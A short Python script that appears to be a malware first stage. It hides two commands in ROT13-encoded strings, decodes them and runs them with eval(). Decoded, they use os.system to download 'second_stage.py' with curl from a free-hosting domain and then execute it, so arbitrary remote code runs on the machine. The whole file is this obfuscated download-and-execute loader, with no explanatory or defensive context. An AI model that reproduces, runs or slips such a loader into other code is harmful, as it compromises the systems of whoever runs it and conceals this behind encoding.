import codecs
import os

first = '''
bf.flfgrz("phey -B uggcf://anhtug-obbxf.000jroubfgncc.pbz/frpbaq_fgntr.cl")
'''

second = '''
bf.flfgrz("Clguba frpbaq_fgntr.cl")
'''

first_decoded = codecs.decode(first, 'rot13')
second_decoded = codecs.decode(second, 'rot13')

eval(first_decoded)
eval(second_decoded)
